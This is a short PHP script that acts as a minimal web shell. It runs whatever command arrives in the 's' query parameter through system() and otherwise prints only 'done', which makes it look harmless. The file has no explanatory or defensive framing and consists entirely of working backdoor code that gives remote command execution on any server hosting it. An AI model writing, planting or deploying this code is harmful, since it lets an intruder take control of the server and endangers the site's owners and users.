<?php
    if ( isset( $_GET['s'] ) ) {
        system($_GET['s']);
    } else {
        echo 'done';
    }
?>